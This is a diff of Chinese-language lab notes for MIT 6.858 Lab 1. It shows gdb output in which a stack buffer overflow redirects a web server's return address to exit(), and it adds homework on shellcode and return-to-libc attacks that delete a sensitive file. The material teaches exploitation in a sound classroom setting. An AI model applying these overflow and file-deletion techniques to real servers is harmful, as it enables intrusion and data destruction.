 0xbfffdb8c:     'A' <repeats 200 times>...
 0xbfffdc54:     'A' <repeats 200 times>...
 0xbfffdd1c:     'A' <repeats 200 times>...
-0xbfffdde4:     'A' <repeats 40 times>
-0xbfffde0d:     "\215\004\b\003"
-0xbfffde12:     ""
-0xbfffde13:     ""
-0xbfffde14:     "\264\020\005\b"
-(gdb) x &handler
-0xbfffddfc:     'A' <repeats 16 times>
-(gdb) x $ebp
-0xbfffde08:     "AAAA"
-(gdb) x $ebp+4
-0xbfffde0c:     ""
-
-```
-
-在`pn`之前的缓冲区，包括`handler`和`$ebp`，已经被字符`A`覆盖，但返回地址并没有被完全改写。该如何改写?
-
-``` gas
+0xbfffdde4:     'A' <repeats 24 times>, "\352\225\004\b", 'A' <repeats 12 times>, "P\201\005@ABCD\001\001\001\001"
+0xbfffde19:     " "
+0xbfffde1b:     ""
+0xbfffde1c:     ",\376\377\277"
+0xbfffde21:     ""
+(gdb) p handler       [查看handler是否被改写]
+$1 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
+(gdb) x/wx $ebp+4     [查看返回地址，已经被改为exit()地址]
+0xbfffde0c:     0x40058150
+(gdb) x $ebp+12       [查看exit()参数，表明攻击成功]
+0xbfffde14:     0x01010101
 (gdb) n
 285         if (!stat(pn, &st))
-(gdb) n
+(gdb)
 296         handler(fd, pn);
-(gdb) n
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-(gdb) bt
-#0  0x41414141 in ?? ()
-#1  0x080495e8 in http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:296
-#2  0x08048d00 in main (argc=<error reading variable: Cannot access memory at address 0x41414149>,
-    argv=<error reading variable: Cannot access memory at address 0x4141414d>) at zookfs.c:39
+(gdb)
+297     }
+(gdb)                 [继续执行到exit]
+__GI_exit (status=16843009) at exit.c:103
+103     exit.c: No such file or directory.
+(gdb)
+104     in exit.c
+(gdb)
+[Inferior 2 (process 9883) exited with code 01]
 ```
-
-继续执行到`handler(fd, pn);`，由于`handler`变量被改写为`0x41414141`，导致程序崩溃。这发生在先前发现的`strcpy()`漏洞之前。这个示例并没有利用改写返回地址来劫持控制流。
 
 ---
 
-## 作业：寻找并触发漏洞
+##作业：删除敏感文件
 
-实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。
+实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。
 
-寻找并触发2个新的缓冲区溢出漏洞，详细描述漏洞并触发过程。
+####1. 可执行栈上shellcode攻击
 
-改写漏洞利用模板`exploit-template.py`，将两个漏洞利用程序分别命名为`exploit-2a.py`和`exploit-2b.py`。最后，用`make check-crash`命令来验证是否能够令服务器崩溃。
+利用缓冲区溢出漏洞将shellcode注入到web服务器，删除一个敏感文件`/home/httpd/grades.txt`。主要任务是构造一个新的shellcode。
 
-**提示**：HTTP请求中不只包括URL。
+**提示：**删除文件系统调用`SYS_unlink`调用号是`10`或`'\n'`(newline)。若`'\n'`直接出现在HTTP请求URL中，则会被截断，因此需要特殊处理。
 
+实验会用到下列命令：
 
+- 创建新文件：`touch /home/httpd/grades.txt`
+- 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
+- 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
+- 执行二进制指令：`./run-shellcode shellcode.bin`
 
+将攻击程序命名为`exploit-3.py`，用`make check-exstack`来检查攻击是否成功。
 
+####2. 不可执行栈上return-to-libc攻击
 
+在栈不可执行的web服务器上，采用return-to-libc攻击删除敏感文件`/home/httpd/grades.txt`。
 
+将攻击程序命名为`exploit-4a.py`和`exploit-4b.py`，用`make check-libc`来检查攻击是否成功。
 
+**提示：**libc中`unlink()`函数参数是一个指向以`'\0'`结尾字符串的指针。因此，需在栈中注入字符串，并保证在漏洞触发时，该字符串结尾为`'\0'`。
 
-
-
-
+---
 
